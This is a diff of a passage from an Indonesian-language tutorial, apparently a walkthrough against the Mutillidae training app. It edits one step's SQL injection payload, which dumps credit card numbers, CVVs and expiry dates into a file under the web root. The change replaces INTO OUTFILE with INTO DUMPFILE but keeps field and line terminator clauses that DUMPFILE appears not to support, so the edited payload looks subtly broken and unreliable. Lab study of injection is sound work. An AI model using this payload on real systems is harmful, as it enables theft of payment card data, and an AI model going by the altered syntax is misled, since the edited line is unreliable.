@@ -37,7 +37,7 @@ AppArmor dalam OS turunan Ubuntu berfungsi untuk membatasi resource dari aktivit
 
 * **Step 4** : Masukkan operasi sql di bawah di dalam textbox **Name** lalu tekan tombol _View Account Details_
 ```
-' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/var/www/html/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' -- 
+' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO DUMPFILE '/var/www/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' -- 
 ```
 Dan jangan lupa untuk menambahkan 1 spasi diakhir, `"-- "`. Operasi ini adalah tidak akan menampilkan hasil, justru Authentication Error. Namun disisi lain akan membuat file **CCN2.txt**
 
